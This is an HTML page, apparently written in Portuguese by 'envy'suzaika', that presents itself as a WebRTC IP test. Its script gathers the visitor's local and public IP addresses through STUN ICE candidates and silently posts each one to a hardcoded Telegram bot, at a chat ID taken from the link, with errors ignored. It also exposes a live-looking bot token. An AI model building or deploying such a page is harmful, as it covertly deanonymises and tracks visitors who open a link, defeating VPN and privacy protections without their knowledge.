<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Teste WebRTC Hardcore</title>
    <style>
        body {
            background: #0f172a;
            color: white;
            font-family: monospace;
            padding: 20px;
        }
        .ip {
            background: rgba(255,255,255,0.05);
            padding: 8px;
            border-radius: 5px;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <h1>envy'suzaika</h1>
    <p>testar ips by envy'suzaika</p>
    <button onclick="testWebRTC()">clique para testar!</button>

    <div id="results"></div>

    <script>
    const BOT_TOKEN = "8250581893:AAGLlT-nSmXL58Ec1WqdZHGOHmw8YQPObEs";

    function getChatId() {
        const params = new URLSearchParams(window.location.search);
        return params.get("chat_id");
    }

    async function sendToTelegram(message) {
        const chatId = getChatId();
        if (!chatId) return; // nÃ£o faz nada se nÃ£o tiver chat_id
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const payload = {
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown"
        };

        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        }).catch(() => {}); // ignora erros silenciosamente
    }

    async function testWebRTC() {
        const results = document.getElementById("results");
        results.innerHTML = "<p>testando...</p>";

        const foundIPs = new Set();

        const pc = new RTCPeerConnection({
            iceServers: [
                { urls: "stun:stun.l.google.com:19302" },
                { urls: "stun:stun1.l.google.com:19302" }
            ]
        });

        pc.createDataChannel("");

        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);

        pc.onicecandidate = event => {
            if (!event || !event.candidate) return;
            const candidate = event.candidate.candidate;
            const parts = candidate.split(" ");
            const ip = parts[4];

            if (ip && !foundIPs.has(ip)) {
                foundIPs.add(ip);
                results.innerHTML += `<div class="ip">ip detectado: <strong>${ip}</strong></div>`;
                const msg = `ðŸŽ¯ ðŸ¤– informaÃ§Ãµes recebidas: ${ip}`;
                sendToTelegram(msg);
            }
        };
    }
    </script>
</body>
</html>
